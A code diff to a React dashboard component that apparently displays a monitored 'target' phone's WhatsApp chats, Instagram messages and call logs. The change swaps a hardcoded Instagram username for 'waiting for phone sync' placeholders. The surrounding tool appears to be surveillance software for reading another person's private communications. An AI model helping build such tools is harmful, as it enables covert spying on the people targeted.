@@ -316,7 +316,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   // Real Data States
   const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
   const [instagramChats, setInstagramChats] = useState<InstagramChatSummary[]>([]);
-  const [instagramAccount, setInstagramAccount] = useState<string>("alone_sparrow_2603");
+  const [instagramAccount, setInstagramAccount] = useState<string>("");
   const [whatsAppCalls, setWhatsAppCalls] = useState<WhatsAppCallEntry[]>([]);
   const [selectedCallId, setSelectedCallId] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
@@ -377,8 +377,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         devicesApi.instagramAccount(deviceId).catch(() => null),
       ]);
 
-      if (igAccountRes?.accountName) {
+      if (igAccountRes && igAccountRes.accountName) {
         setInstagramAccount(igAccountRes.accountName);
+      } else {
+        setInstagramAccount("");
       }
 
       const isSystemNoise = (name: string | null | undefined): boolean => {
@@ -1426,10 +1428,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                 </div>
                 <div className="min-w-0 flex-1">
                   <p className="text-xs font-black text-gray-900 font-mono truncate">
-                    @{instagramAccount}
+                    {instagramAccount ? `@${instagramAccount}` : "Detecting..."}
                   </p>
                   <p className="text-[9px] text-emerald-700 font-semibold flex items-center gap-1">
-                    <span>✓ Logged In</span>
+                    <span>{instagramAccount ? "✓ Logged In" : "⏳ Pending Phone Sync"}</span>
                   </p>
                 </div>
               </div>
@@ -1604,13 +1606,19 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               Logged-in Target ID
                             </p>
                             <p className="text-xs font-black text-gray-900 font-mono truncate">
-                              @{instagramAccount}
+                              {instagramAccount ? `@${instagramAccount}` : "Waiting for phone sync..."}
                             </p>
                           </div>
                         </div>
-                        <span className="shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200 flex items-center gap-1">
-                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
-                          Online
+                        <span className={`shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full border flex items-center gap-1 ${
+                          instagramAccount
+                            ? "bg-emerald-100 text-emerald-800 border-emerald-200"
+                            : "bg-amber-100 text-amber-800 border-amber-200"
+                        }`}>
+                          <span className={`w-1.5 h-1.5 rounded-full ${
+                            instagramAccount ? "bg-emerald-500 animate-pulse" : "bg-amber-500"
+                          }`} />
+                          {instagramAccount ? "Online" : "Pending"}
                         </span>
                       </div>
                       <div className="flex items-center justify-between pt-1 border-t border-pink-200/50 text-[11px] font-semibold text-gray-700">
@@ -2776,7 +2784,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             Target Phone Instagram ID
                           </div>
                           <h3 className="text-2xl font-black text-gray-900 font-mono tracking-tight pt-1">
-                            @{instagramAccount}
+                            {instagramAccount ? `@${instagramAccount}` : "Waiting for phone sync..."}
                           </h3>
                           <p className="text-xs text-gray-500 leading-relaxed">
                             Target phone-la active-aa irukura Instagram login account. Left panel-la irundhu direct chat select panna conversation kaatum.
